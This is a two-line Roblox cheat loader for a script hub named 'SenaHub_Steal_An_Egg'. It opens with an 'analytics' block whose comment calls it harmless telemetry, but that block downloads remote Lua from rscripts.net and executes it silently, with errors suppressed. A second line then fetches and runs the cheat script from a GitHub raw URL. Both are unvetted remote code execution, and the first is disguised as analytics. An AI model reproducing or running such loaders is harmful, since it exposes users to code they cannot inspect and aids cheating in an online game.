--[[rscripts:analytics:start]]
-- Script analytics (enabled by the creator on rscripts.net).
-- Runs in its own thread and cannot affect the script below.
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6aca548a92d24c962db352a5"))()
	end)
end)
--[[rscripts:analytics:end]]

loadstring(game:HttpGet("https://raw.githubusercontent.com/LSSOPS/OpenSource/refs/heads/main/SenaHub_Steal_An_Egg!.lua"))()
